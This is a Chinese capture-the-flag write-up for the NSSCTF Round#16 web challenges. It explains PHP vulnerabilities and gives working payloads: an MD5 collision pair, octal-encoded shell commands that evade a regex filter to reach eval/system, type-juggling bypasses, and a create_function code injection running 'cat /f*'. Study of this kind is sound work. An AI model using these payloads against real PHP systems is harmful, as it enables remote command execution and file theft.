---
title: "nssctf-round#16web部分wp"
date: "2024-01-26"
description: "[toc]"
---

\[toc\]

* * *

> hello ,今天带来的是最近的nssctf的round#16的web wp

# [](#NSSRound-16-Basic-RCE但是没有完全RCE "[NSSRound#16 Basic]RCE但是没有完全RCE")\[NSSRound#16 Basic\]RCE但是没有完全RCE

## [](#第一关 "第一关")第一关

### [](#思路 "思路")思路

```php
if ((string)$_GET['md5_1'] !== (string)$_GET['md5_2'] && md5($_GET['md5_1']) === md5($_GET['md5_2'])) 
```

> 可以看到依旧是md5强比较 并且string() 函数导致我们无法使用数组直接绕过  
> 可以使用md5碰撞 找到两个数据不同但是md5相同的值

### [](#EXP "EXP")EXP

> md5\_1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2  
> &  
> md5\_2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2  
> post参数 md5\_3=1

## [](#第二关-3z-RC3-php "第二关  3z_RC3.php")第二关 3z\_RC3.php

### [](#思路-1 "思路")思路

```php
 <?phperror_reporting(0);highlight_file(__FILE__);$shell = $_POST['shell'];$cmd = $_GET['cmd'];if(preg_match('/f|l|a|g|\*|\?/i',$cmd)){    die("Hacker!!!!!!!!");}eval($shell($cmd)); 
```

> **方法一**:  
> 一般来讲思路就是直接用$shell当作system 主要是如何绕过cmd中的命令  
> 可以使用八进制编码  
> cmd=$(echo “\\154\\163”) ls命令  
> cmd=$(echo “\\143\\141\\164\\40\\57\\146\\52”) cat /f\*  
> **方法二:**  
> 传递参数方法 shell=urldecode&123=cat /f\*  
> cmd=system($\_POST\[‘123’\]);

### [](#EXP-1 "EXP")EXP

> **方法一**:  
> cmd=$(echo “\\154\\163”) ls命令  
> cmd=$(echo “\\143\\141\\164\\40\\57\\146\\52”) cat /f\*  
> **方法二:**  
> shell=urldecode&123=cat /f\*  
> cmd=system($\_POST\[‘123’\]);

* * *

# [](#NSSRound-16-Basic-了解过PHP特性吗 "[NSSRound#16 Basic]了解过PHP特性吗")\[NSSRound#16 Basic\]了解过PHP特性吗

## [](#第一关思路 "第一关思路")第一关思路

> 主要分为五个关 直到最后便可以通关

### [](#1 "(1)")(1)

```php
if (preg_match("/[0-9]/", $num)) {    die("no!!");}if (intval($num)) {    $checker_1 = TRUE;
```

> intval绕过直接传递数组 num\[\]=1

### [](#2 "(2)")(2)

```php
$ctype = strrev($_POST['ctype']);$is_num = strrev($_POST['is_num']);if (ctype_alpha($ctype) && is_numeric($is_num) && md5($ctype) == md5($is_num)) {    $checker_2 = TRUE; 
```

> php 弱比较 判定ctype必须全是字母 is\_num全是数字  
> 主要要取逆序 则数字可以取 807016042  
> 字母可以取 OZDCKNQ

### [](#3 "(3)")(3)

```php
if (isset($_114) && intval($_114) > 114514 && strlen($_114) <= 3) {    if (!is_numeric($_514) && $_514 > 9999999) {        $checker_3 = TRUE;    } 
```

> 依旧是php的弱比较需要知道php 科学计数法相关内容  
> 114=9e9 9e9科学计数法大于114514  
> 514不能全是数字那么根据若比较99999991a 是大于 9999999

### [](#4 "(4)")(4)

```php
if (is_array($arr4y)) {    for ($i = 0; $i < count($arr4y); $i++) {        if ($arr4y[$i] === "NSS") {            die("no!");        }        $arr4y[$i] = intval($arr4y[$i]);    }    if (array_search("NSS", $arr4y) === 0) {        $checker_4 = TRUE;    }
```

> 主要是array\_search函数的bug 它用的是弱比较搜索”NSS” 因此直接传一个array\[\]=0 就可以了可以直接绕过for循环语句 并且在array\_search中0==”NSS” 得到0对应的序号就是第一个也是0 则0===0

## [](#第二关 "第二关")第二关

```php
<?phperror_reporting(0);highlight_file(__FILE__);$nss=$_POST['nss'];$shell = $_POST['shell'];if(isset($shell)&& isset($nss)){    $nss_shell = create_function($shell,$nss);} 
```

> nss=echo 0;}system(“cat /f\*”);//&shell=  
> 这一关主要就是一个creat\_function函数的作用  
> 产生的代码执行 ;}闭合掉函数的} 使得后面的system函数成为独立的代码
